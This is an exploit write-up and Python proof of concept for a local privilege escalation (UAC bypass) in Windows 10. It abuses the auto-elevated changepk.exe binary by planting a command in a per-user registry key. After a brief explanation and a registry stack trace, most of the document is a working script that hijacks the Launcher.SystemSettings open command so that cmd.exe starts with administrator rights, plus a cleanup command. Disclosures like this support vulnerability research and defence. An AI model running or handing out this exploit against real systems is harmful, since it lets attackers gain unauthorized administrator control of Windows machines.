# Exploit Title: Microsoft Windows 10 - Local Privilege Escalation (UAC Bypass)
# Author: Nassim Asrir
# Date: 2019-01-10
# Exploit Author: Nassim Asrir
# CVE: N/A
# Tested On: Windows 10Pro 1809
# Vendor : https://www.microsoft.com

# Technical Details

# I discovered a Local Privilege Escalation in Windows 10 (UAC Bypass), via an auto-elevated process.
# The executable is changepk.exe. changepk is used to pass a new product key, you can pass the key also via commandline.
# By executing changepk.exe and tracing the process we can see some RegOpenKey operations that lead to open some non-found Key in the registry (HKCU).
# In our case we can use "HKCU:\Software\Classes\Launcher.SystemSettings\Shell\Open\Command" to spawn our Administrator cmd or to bypass the mmc UAC.

# ntoskrnl.exe	ObOpenObjectByNameEx + 0x32db	0xfffff8073106270b	C:\WINDOWS\system32\ntoskrnl.exe
# ntoskrnl.exe	RtlMapGenericMask + 0x2548	0xfffff80731090118	C:\WINDOWS\system32\ntoskrnl.exe
# ntoskrnl.exe	ObOpenObjectByNameEx + 0x1bd9	0xfffff80731061009	C:\WINDOWS\system32\ntoskrnl.exe
# ntoskrnl.exe	ObOpenObjectByNameEx + 0x1df	0xfffff8073105f60f	C:\WINDOWS\system32\ntoskrnl.exe
# ntoskrnl.exe	SeCaptureSubjectContextEx + 0x7c8	0xfffff8073105dc98	C:\WINDOWS\system32\ntoskrnl.exe
# ntoskrnl.exe	SeCaptureSubjectContextEx + 0x51f	0xfffff8073105d9ef	C:\WINDOWS\system32\ntoskrnl.exe
# ntoskrnl.exe	setjmpex + 0x78e5	0xfffff80730bd9c05	C:\WINDOWS\system32\ntoskrnl.exe
# ntdll.dll	ZwOpenKeyEx + 0x14	0x7ff877501a94	C:\Windows\System32\ntdll.dll
# KernelBase.dll	RegEnumKeyExW + 0x4c5	0x7ff874161655	C:\Windows\System32\KernelBase.dll
# KernelBase.dll	MapPredefinedHandleInternal + 0xca5	0x7ff874162fb5	C:\Windows\System32\KernelBase.dll
# KernelBase.dll	RegOpenKeyExInternalW + 0x141	0x7ff874161fa1	C:\Windows\System32\KernelBase.dll
# KernelBase.dll	RegOpenKeyExW + 0x19	0x7ff874161e49	C:\Windows\System32\KernelBase.dll
# SHCore.dll	SHGetValueW + 0x8c	0x7ff87469bfcc	C:\Windows\System32\SHCore.dll
# shell32.dll	Ordinal790 + 0xb282	0x7ff87532fd22	C:\Windows\System32\shell32.dll
# shell32.dll	Ordinal790 + 0xad56	0x7ff87532f7f6	C:\Windows\System32\shell32.dll
# shell32.dll	SHChangeNotification_Lock + 0x2b8	0x7ff8753a2a58	C:\Windows\System32\shell32.dll
# shell32.dll	Ordinal790 + 0xb0cb	0x7ff87532fb6b	C:\Windows\System32\shell32.dll
# shell32.dll	Ordinal790 + 0xa254	0x7ff87532ecf4	C:\Windows\System32\shell32.dll
# shell32.dll	Ordinal790 + 0xa7c6	0x7ff87532f266	C:\Windows\System32\shell32.dll
# shell32.dll	Shell_NotifyIconW + 0x1695	0x7ff875349c75	C:\Windows\System32\shell32.dll
# shell32.dll	SHGetFileInfoW + 0x18a5	0x7ff87536a8c5	C:\Windows\System32\shell32.dll
# shell32.dll	SignalFileOpen + 0x33b	0x7ff8753a140b	C:\Windows\System32\shell32.dll
# shell32.dll	SignalFileOpen + 0x25b	0x7ff8753a132b	C:\Windows\System32\shell32.dll
# shell32.dll	Ordinal99 + 0x9c6	0x7ff87534ff96	C:\Windows\System32\shell32.dll
# shell32.dll	SHGetSpecialFolderLocation + 0x28e	0x7ff8753bac5e	C:\Windows\System32\shell32.dll
# SHCore.dll	Ordinal233 + 0x3c5	0x7ff8746ac315	C:\Windows\System32\SHCore.dll
# kernel32.dll	BaseThreadInitThunk + 0x14	0x7ff875087974	C:\Windows\System32\kernel32.dll
# ntdll.dll	RtlUserThreadStart + 0x21	0x7ff8774ca271	C:\Windows\System32\ntdll.dll


# Exploit
# To exploit the vulnerability you can use this python code then execute it and you will get the Windows Activation just click Yes and you will redirect the execution to cmd.exe.

# -*- coding: utf-8 -*-
import os
import sys
import ctypes
import _winreg
import time

print "Creating Registry Key ....."
print ""
time.sleep(3)
def create_reg_key(key, value):

    try:  
        _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, 'Software\Classes\Launcher.SystemSettings\Shell\Open\Command')
        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, 'Software\Classes\Launcher.SystemSettings\Shell\Open\Command', 0, _winreg.KEY_WRITE)                
        _winreg.SetValueEx(registry_key, key, 0, _winreg.REG_SZ, value)        
        _winreg.CloseKey(registry_key)
    except WindowsError:        
        raise

print "Registry Key Created :)"
print ""
print "Inserting the command ...."
time.sleep(3)
print ""
def exec_bypass_uac(cmd):
    try:
        create_reg_key('DelegateExecute', '')
        create_reg_key(None, cmd)    
    except WindowsError:
        raise

def bypass_uac():     
 try:                
    current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
    cmd = "C:\windows\System32\cmd.exe"
    exec_bypass_uac(cmd)                
    os.system(r'C:\windows\system32\changepk.exe')  
    return 1               
 except WindowsError:
    sys.exit(1)       

if __name__ == '__main__':

    if bypass_uac():
        print "Good job you got your Administrator cmd :)"


# Don't Fogot:  reg delete "HKCU\Software\Classes\Launcher.SystemSettings\Shell\Open\Command" /f